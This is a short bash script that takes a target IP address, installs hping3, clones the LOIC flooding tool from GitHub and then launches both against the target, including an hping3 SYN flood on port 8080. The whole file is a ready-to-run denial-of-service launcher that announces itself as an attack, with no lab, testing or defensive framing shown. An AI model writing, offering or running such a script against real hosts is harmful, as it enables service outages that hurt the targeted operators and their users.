#!/bin/bash

# Check if the user provided the target IP addressss
if [ -z "$1" ]; then
  echo "Please enter the target IP address."
  exit 1
fi

TARGET_IP=$1
PORT=8080

# Check if required tools (LOIC and Hping3) are installed
echo "Checking if tools are installed..."

# Install Hping3 if it's not installed
if ! command -v hping3 &> /dev/null; then
  echo "Hping3 is not installed. Installing it now..."
  sudo apt update
  sudo apt install hping3 -y
fi

# Download LOIC if it's not present
LOIC_DIR="$HOME/LOIC"
if [ ! -d "$LOIC_DIR" ]; then
  echo "LOIC is not present. Cloning it now..."
  git clone https://github.com/NewEraCracker/LOIC.git "$LOIC_DIR"
  cd "$LOIC_DIR"
  sudo apt install mono-complete -y
fi

echo "Starting attack on target $TARGET_IP via LOIC, Hping3"

# Run LOIC
echo "Running LOIC..."
xterm -hold -e "bash $LOIC_DIR/loic.sh run" &

# Run Hping3 - SYN Flood
echo "Running Hping3 - SYN Flood..."
xterm -hold -e "hping3 -S -p $PORT --flood $TARGET_IP" &

echo "Attack on target $TARGET_IP has started successfully!"
